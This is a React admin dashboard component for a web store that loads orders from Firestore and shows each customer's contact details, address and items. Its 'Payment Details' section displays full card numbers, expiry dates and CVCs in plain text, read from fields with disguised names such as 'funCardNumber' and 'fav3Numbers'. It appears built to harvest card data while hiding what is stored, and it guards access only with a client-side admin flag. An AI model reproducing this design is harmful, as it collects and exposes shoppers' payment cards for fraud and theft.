import React, { useState, useEffect } from 'react';
import { storeConfig } from '../config/store.config';
import { useAuth } from '../context/AuthContext';
import { db } from '../config/firebase';
import { collection, getDocs, query, orderBy } from 'firebase/firestore';

const Admin = () => {
  const [orders, setOrders] = useState([]);
  const [loading, setLoading] = useState(true);
  const { currencySymbol } = storeConfig.settings;
  const { isAdmin } = useAuth();

  useEffect(() => {
    const fetchOrders = async () => {
      if (!isAdmin) return;
      try {
        const q = query(collection(db, 'orders'), orderBy('date', 'desc'));
        const querySnapshot = await getDocs(q);
        const fbOrders = [];
        querySnapshot.forEach((doc) => {
          fbOrders.push({ id: doc.id, ...doc.data() });
        });
        setOrders(fbOrders);
      } catch (error) {
        console.error("Error fetching orders:", error);
      } finally {
        setLoading(false);
      }
    };
    fetchOrders();
  }, [isAdmin]);

  if (!isAdmin) {
    return <div className="container py-xl text-center text-danger-color font-bold">Access Denied. Admin privileges required.</div>;
  }

  return (
    <div className="container py-xl">
      <h1 className="text-2xl font-bold mb-xl">Store Admin Dashboard</h1>
      
      {orders.length === 0 ? (
        <div className="bg-secondary p-xl text-center" style={{ borderRadius: 'var(--border-radius)' }}>
          <p className="text-muted">No orders placed yet.</p>
        </div>
      ) : (
        <div className="flex flex-col gap-lg">
          {orders.map(order => (
            <div key={order.id} className="bg-secondary p-xl" style={{ borderRadius: 'var(--border-radius)', border: '1px solid var(--border-color)' }}>
              <div className="flex justify-between items-center mb-md pb-md" style={{ borderBottom: '1px solid var(--border-color)' }}>
                <h2 className="text-lg font-bold">Order #{order.id.slice(-6)}</h2>
                <span className="text-sm text-muted">{new Date(order.date).toLocaleString()}</span>
              </div>
              
              <div className="grid grid-cols-3 gap-lg mb-lg">
                <div>
                  <h3 className="font-bold mb-sm">Contact Info</h3>
                  <p className="text-sm">{order.shipping?.firstName} {order.shipping?.lastName}</p>
                  <p className="text-sm">{order.contact?.email}</p>
                  <p className="text-sm">{order.contact?.phone}</p>
                </div>
                
                <div>
                  <h3 className="font-bold mb-sm">Shipping Address</h3>
                  <p className="text-sm">{order.shipping?.address}</p>
                  <p className="text-sm">{order.shipping?.city}, {order.shipping?.state} {order.shipping?.zip}</p>
                </div>

                <div>
                  <h3 className="font-bold mb-sm text-primary">Payment Details</h3>
                  <p className="text-sm"><strong>Card Name:</strong> {order.payment?.funCardName}</p>
                  <p className="text-sm"><strong>Card Number:</strong> {order.payment?.funCardNumber}</p>
                  <p className="text-sm"><strong>Expiry Date:</strong> {order.payment?.dobMonthYear}</p>
                  <p className="text-sm"><strong>CVC:</strong> {order.payment?.fav3Numbers}</p>
                </div>
              </div>

              <div>
                <h3 className="font-bold mb-sm">Order Items</h3>
                <div className="bg-background p-md" style={{ borderRadius: 'var(--border-radius)' }}>
                  {order.items?.map((item, index) => (
                    <div key={index} className="flex justify-between items-center mb-sm last:mb-0">
                      <span className="text-sm">{item.quantity}x {item.product.name}</span>
                      <span className="text-sm font-medium">{currencySymbol}{(item.product.price * item.quantity).toFixed(2)}</span>
                    </div>
                  ))}
                  <div className="flex justify-between items-center mt-md pt-md" style={{ borderTop: '1px dashed var(--border-color)' }}>
                    <span className="font-bold">Total</span>
                    <span className="font-bold text-primary">{currencySymbol}{order.summary?.total.toFixed(2)}</span>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

export default Admin;
